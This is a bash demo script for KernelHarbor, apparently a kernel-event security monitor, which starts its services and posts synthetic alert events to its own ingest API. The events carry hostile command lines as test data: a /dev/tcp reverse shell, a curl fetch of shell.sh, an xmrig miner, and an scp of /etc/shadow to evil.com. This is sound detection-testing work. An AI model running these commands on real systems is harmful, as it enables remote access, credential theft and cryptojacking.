#!/usr/bin/env bash
set -uo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OPENCLAW_DIR="$REPO_ROOT/kernelharbor-openclaw"
ANALYSIS_DIR="$REPO_ROOT/cmd/analysis"
BIN_DIR="$OPENCLAW_DIR/bin"
ANALYSIS_BIN="$BIN_DIR/analysis"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

info()  { echo -e "${GREEN}✓${NC} $1"; }
warn()  { echo -e "${YELLOW}⚠${NC} $1"; }
err()   { echo -e "${RED}✗${NC} $1"; }
step()  { echo -e "${CYAN}${BOLD}▶${NC} ${BOLD}$1${NC}"; }

MODE="standalone"
if [[ "${1:-}" == "--docker" ]]; then
  MODE="docker"
fi

if [[ "$MODE" == "docker" ]]; then
  echo -e "${BOLD}KernelHarbor Docker Stack Demo${NC}"
  echo -e "${BOLD}============================${NC}"
  echo ""

  if ! command -v docker &>/dev/null; then
    err "Docker is required for stack mode"
    exit 1
  fi

  if ! command -v docker &>/dev/null || ! docker compose version &>/dev/null; then
    err "Docker Compose v2 is required"
    exit 1
  fi

  step "Building Docker images..."
  docker compose -f "$OPENCLAW_DIR/docker-compose.yml" build 2>&1 || { err "Build failed"; exit 1; }
  info "Images built"

  echo ""
  step "Starting full stack..."
  echo "  Elasticsearch + Analysis + Gateway (signer + webhook + dashboard)"
  echo "  Falco + falcosidekick will monitor real kernel events"
  echo ""

  KH_SIGNING_SECRET="${KH_SIGNING_SECRET:-kh-demo-secret}" \
  KH_API_KEY="${KH_API_KEY:-}" \
  docker compose -f "$OPENCLAW_DIR/docker-compose.yml" up -d elasticsearch 2>&1
  sleep 5

  KH_SIGNING_SECRET="${KH_SIGNING_SECRET:-kh-demo-secret}" \
  KH_API_KEY="${KH_API_KEY:-}" \
  docker compose -f "$OPENCLAW_DIR/docker-compose.yml" up -d analysis 2>&1
  sleep 3

  KH_SIGNING_SECRET="${KH_SIGNING_SECRET:-kh-demo-secret}" \
  KH_API_KEY="${KH_API_KEY:-}" \
  docker compose -f "$OPENCLAW_DIR/docker-compose.yml" up -d gateway falcosidekick 2>&1
  sleep 3

  step "Starting Falco (requires privileged mode for eBPF)..."
  KH_SIGNING_SECRET="${KH_SIGNING_SECRET:-kh-demo-secret}" \
  docker compose -f "$OPENCLAW_DIR/docker-compose.yml" up -d falco 2>&1 || {
    warn "Falco failed to start (needs privileged mode / eBPF support). Continuing without live kernel monitoring."
    warn "You can still send demo events to the analysis service."
  }

  if [[ "${USE_LLM:-0}" == "1" ]] || [[ "${KH_LLM_BACKEND:-}" == "ollama" ]]; then
    step "Starting Ollama (LLM)..."
    docker compose -f "$OPENCLAW_DIR/docker-compose.yml" --profile llm up -d ollama 2>&1 || warn "Ollama failed to start"
  fi

  echo ""
  step "Sending demo events (via analysis API)..."
  TS=$(date -u +"%Y-%m-%dT%H:%M:%S.000Z")

  docker compose -f "$OPENCLAW_DIR/docker-compose.yml" --profile demo up demo-sender 2>&1 || {
    warn "Demo sender failed, trying direct curl..."
    for event in \
      "[{\"@timestamp\":\"$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\",\"image.path\":\"/usr/bin/bash\",\"process.pid\":3001,\"parent.pid\":1,\"user.name\":\"nobody\"}]" \
      "[{\"@timestamp\":\"$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"/tmp/.hidden/xmrig --url=stratum+tcp://pool.minexmr.com:443\",\"image.path\":\"/tmp/.hidden/xmrig\",\"process.pid\":4001,\"parent.pid\":1,\"user.name\":\"nobody\"}]"; do
      curl -s -X POST "http://localhost:8080/ingest" -H "Content-Type: application/json" -d "$event" 2>/dev/null || true
      sleep 1
    done
  }

  sleep 3

  echo ""
  echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${GREEN}${BOLD}Docker stack is live!${NC}"
  echo ""
  echo "  Dashboard:      http://localhost:8181"
  echo "  Alerts API:     curl http://localhost:8080/api/alerts"
  echo "  Stats API:       curl http://localhost:8080/api/alerts/stats"
  echo "  Gateway status: curl http://localhost:8181/kh/status"
  echo "  Ingest more:     curl -X POST http://localhost:8080/ingest -H 'Content-Type: application/json' -d '[...]'"
  echo ""
  echo "  Pipeline: Falco -> falcosidekick -> signer(HMAC) -> webhook -> analysis"
  echo "  Signer:   :28079  |  Webhook: :28080  |  HMAC secret: ${KH_SIGNING_SECRET:-kh-demo-secret}"
  echo ""
  echo "  ${BOLD}Stop:${NC}  docker compose -f $OPENCLAW_DIR/docker-compose.yml --profile demo down"
  echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

  exit 0
fi

LLM_MODEL="${OLLAMA_MODEL:-qwen2.5:7b}"
ES_PORT="${ES_PORT:-9200}"
ANALYSIS_HTTP_PORT="${ANALYSIS_HTTP_PORT:-8080}"
DASHBOARD_PORT="${DASHBOARD_PORT:-8181}"
USE_LLM="${USE_LLM:-1}"
USE_ES="${USE_ES:-1}"

PIDS=()
cleanup() {
  echo ""
  step "Shutting down..."
  for pid in "${PIDS[@]}"; do
    kill "$pid" 2>/dev/null && wait "$pid" 2>/dev/null || true
  done
  if [[ -n "${ES_CONTAINER:-}" ]]; then
    docker stop "$ES_CONTAINER" >/dev/null 2>&1
    docker rm "$ES_CONTAINER" >/dev/null 2>&1
  fi
  info "Cleaned up"
}
trap cleanup EXIT INT TERM

echo -e "${BOLD}KernelHarbor Standalone Demo${NC}"
echo -e "${BOLD}===========================${NC}"
echo ""

check_prereq() {
  if command -v "$1" &>/dev/null; then
    info "$1 found"
    return 0
  else
    warn "$1 not found ($2)"
    return 1
  fi
}

check_prereq go "https://go.dev/dl/" || { err "Go is required"; exit 1; }
check_prereq ollama "https://ollama.com" || USE_LLM=0
check_prereq docker "https://docs.docker.com/get-docker/" || USE_ES=0

echo ""

step "Building analysis service..."
mkdir -p "$BIN_DIR"
cd "$ANALYSIS_DIR" && go build -o "$ANALYSIS_BIN" . || { err "Build failed"; exit 1; }
info "Built $ANALYSIS_BIN"

if [[ "$USE_ES" == "1" ]]; then
  step "Starting Elasticsearch (Docker)..."
  ES_CONTAINER="kh-demo-es-$$"
  docker run -d --name "$ES_CONTAINER" -p "$ES_PORT:9200" \
    -e "discovery.type=single-node" \
    -e "xpack.security.enabled=false" \
    -e "ES_JAVA_OPTS=-Xms512m -Xmx512m" \
    docker.elastic.co/elasticsearch/elasticsearch:8.17.4 >/dev/null 2>&1 || {
      warn "Elasticsearch failed to start, continuing without persistence"
      USE_ES=0
      ES_CONTAINER=""
    }

  if [[ "$USE_ES" == "1" ]]; then
    info "Waiting for Elasticsearch to be ready..."
    for i in $(seq 1 30); do
      if curl -s "http://localhost:$ES_PORT/_cluster/health" >/dev/null 2>&1; then
        break
      fi
      sleep 2
    done
    if curl -s "http://localhost:$ES_PORT/_cluster/health" >/dev/null 2>&1; then
      info "Elasticsearch ready on :$ES_PORT"
    else
      warn "Elasticsearch not ready after 60s, continuing without"
      USE_ES=0
    fi
  fi
fi

if [[ "$USE_LLM" == "1" ]]; then
  step "Checking Ollama model ($LLM_MODEL)..."
  if curl -s "http://localhost:11434/api/tags" | grep -q "\"$LLM_MODEL\"" 2>/dev/null; then
    info "Model $LLM_MODEL already pulled"
  else
    info "Pulling $LLM_MODEL (this may take a few minutes)..."
    ollama pull "$LLM_MODEL" 2>/dev/null || warn "Failed to pull model"
  fi

  EMBED_MODEL="${OLLAMA_EMBED_MODEL:-nomic-embed-text}"
  if curl -s "http://localhost:11434/api/tags" | grep -q "\"$EMBED_MODEL\"" 2>/dev/null; then
    info "Embedding model $EMBED_MODEL already pulled"
  else
    info "Pulling $EMBED_MODEL..."
    ollama pull "$EMBED_MODEL" 2>/dev/null || warn "Failed to pull embedding model"
  fi
fi

step "Starting analysis service..."
ANALYSIS_ENV="HTTP_ADDRESS=127.0.0.1:$ANALYSIS_HTTP_PORT GRPC_ADDRESS=:9090 PROTOCOL=both"
if [[ "$USE_LLM" == "1" ]]; then
  ANALYSIS_ENV="$ANALYSIS_ENV LLM_BACKEND=ollama OLLAMA_ADDRESS=http://localhost:11434 OLLAMA_MODEL=$LLM_MODEL"
  info "LLM backend: ollama ($LLM_MODEL)"
else
  ANALYSIS_ENV="$ANALYSIS_ENV LLM_BACKEND=none"
  warn "No LLM, running heuristic-only mode"
fi
if [[ "$USE_ES" == "1" ]]; then
  ANALYSIS_ENV="$ANALYSIS_ENV ES_ADDRESSES=http://localhost:$ES_PORT"
  info "Elasticsearch persistence enabled"
fi

env $ANALYSIS_ENV "$ANALYSIS_BIN" &
ANALYSIS_PID=$!
PIDS+=($ANALYSIS_PID)
sleep 2

if kill -0 "$ANALYSIS_PID" 2>/dev/null; then
  info "Analysis running on :$ANALYSIS_HTTP_PORT (PID $ANALYSIS_PID)"
else
  err "Analysis failed to start"
  exit 1
fi

step "Sending demo events..."

send_event() {
  curl -s -X POST "http://localhost:$ANALYSIS_HTTP_PORT/ingest" \
    -H "Content-Type: application/json" \
    -d "$1" >/dev/null 2>&1
}

TS=$(date -u +"%Y-%m-%dT%H:%M:%S.000Z")

info "Sending benign event..."
send_event "[{\"@timestamp\":\"$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"ls -la /home/user\",\"image.path\":\"/usr/bin/ls\",\"process.pid\":1001,\"parent.pid\":1,\"user.name\":\"user\",\"file.path\":\"\"}]"
sleep 1

info "Sending suspicious event (network tool + connection)..."
send_event "[{\"@timestamp\":\"$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"/usr/bin/curl http://192.168.1.100:4444/shell.sh\",\"image.path\":\"/usr/bin/curl\",\"process.pid\":2001,\"parent.pid\":1,\"user.name\":\"root\",\"file.path\":\"\"},{\"@timestamp\":\"$TS\",\"host.name\":\"demo-box\",\"event.type\":\"network\",\"command.line\":\"/usr/bin/curl\",\"image.path\":\"/usr/bin/curl\",\"process.pid\":2001,\"parent.pid\":1,\"user.name\":\"root\",\"local.address\":\"10.0.0.5\",\"local.port\":43210,\"remote.address\":\"192.168.1.100\",\"remote.port\":4444}]"
sleep 1

info "Sending malicious event (reverse shell pattern)..."
send_event "[{\"@timestamp\":\"$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\",\"image.path\":\"/usr/bin/bash\",\"process.pid\":3001,\"parent.pid\":1,\"user.name\":\"nobody\",\"file.path\":\"\"}]"
sleep 1

info "Sending crypto mining event..."
send_event "[{\"@timestamp\":\"$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"/tmp/.hidden/xmrig --url=stratum+tcp://pool.minexmr.com:443\",\"image.path\":\"/tmp/.hidden/xmrig\",\"process.pid\":4001,\"parent.pid\":3001,\"user.name\":\"nobody\",\"file.path\":\"/tmp/.hidden/xmrig\"}]"
sleep 1

info "Sending data exfiltration event..."
send_event "[{\"@timestamp\":\"$TS\",\"host.name\":\"demo-box\",\"event.type\":\"network\",\"command.line\":\"/usr/bin/scp /etc/shadow attacker@evil.com:~\",\"image.path\":\"/usr/bin/scp\",\"process.pid\":5001,\"parent.pid\":1,\"user.name\":\"root\",\"local.address\":\"10.0.0.5\",\"local.port\":54321,\"remote.address\":\"45.33.32.156\",\"remote.port\":22}]"

echo ""
step "Checking alerts..."
sleep 3

ALERTS=$(curl -s "http://localhost:$ANALYSIS_HTTP_PORT/api/alerts?since=24h&limit=20" 2>/dev/null || echo "{}")
TOTAL=$(echo "$ALERTS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('alerts',[])))" 2>/dev/null || echo "?")
info "$TOTAL alerts generated"

if [[ "$USE_LLM" == "1" ]]; then
  echo ""
  step "Waiting for LLM analysis (up to 60s)..."
  echo "   (interestingness-gated: only high-scoring batches trigger LLM)"
  sleep 10
  ALERTS=$(curl -s "http://localhost:$ANALYSIS_HTTP_PORT/api/alerts?since=24h&limit=20" 2>/dev/null || echo "{}")
  TOTAL=$(echo "$ALERTS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('alerts',[])))" 2>/dev/null || echo "?")
  info "$TOTAL alerts after LLM analysis"
fi

echo ""
step "Stats..."
curl -s "http://localhost:$ANALYSIS_HTTP_PORT/api/alerts/stats" 2>/dev/null | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(f'  Total (24h):   {d.get(\"total\", 0)}')
print(f'  Malicious:     {d.get(\"verdicts\", {}).get(\"malicious\", 0)}')
print(f'  Suspicious:    {d.get(\"verdicts\", {}).get(\"suspicious\", 0)}')
print(f'  Benign:        {d.get(\"verdicts\", {}).get(\"benign\", 0)}')
print(f'  Confirmed:     {d.get(\"feedback\", {}).get(\"confirmed\", 0)}')
print(f'  False Pos:     {d.get(\"feedback\", {}).get(\"false_positive\", 0)}')
" 2>/dev/null || warn "Could not fetch stats"

echo ""
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}${BOLD}Demo is live!${NC}"
echo ""
echo "  Dashboard:     http://localhost:$DASHBOARD_PORT"
echo "  Alerts API:    curl http://localhost:$ANALYSIS_HTTP_PORT/api/alerts"
echo "  Stats API:      curl http://localhost:$ANALYSIS_HTTP_PORT/api/alerts/stats"
echo "  Ingest more:    curl -X POST http://localhost:$ANALYSIS_HTTP_PORT/ingest -H 'Content-Type: application/json' -d '[...]'"
echo ""
echo "  Press ${BOLD}Ctrl+C${NC} to stop all services"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

if [[ -f "$OPENCLAW_DIR/cli/dashboard.mjs" ]]; then
  echo ""
  step "Starting dashboard on :$DASHBOARD_PORT..."
  KH_DASHBOARD_PORT="$DASHBOARD_PORT" node "$OPENCLAW_DIR/cli/dashboard.mjs" &
  DASH_PID=$!
  PIDS+=($DASH_PID)
fi

wait
